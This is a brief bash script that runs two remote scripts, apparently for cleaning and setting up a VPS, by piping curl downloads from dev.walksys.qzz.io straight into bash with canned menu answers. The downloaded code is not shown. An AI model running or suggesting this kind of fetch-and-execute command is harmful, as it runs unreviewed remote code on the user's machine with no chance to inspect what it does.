#!/bin/bash

# Go to home directory first
cd

# First Script
printf "1\n0\n" | bash <(curl -s https://dev.walksys.qzz.io/TitanCleaner.sh)

# Second Script
printf "3\n2\n1\n" | bash <(curl -s https://dev.walksys.qzz.io/VPS)
